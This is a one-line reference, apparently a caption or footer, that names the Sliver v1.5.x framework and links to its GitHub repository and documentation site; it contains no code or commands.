*Sliver v1.5.x — [GitHub](https://github.com/BishopFox/sliver) — [Docs](https://sliver.sh/docs)*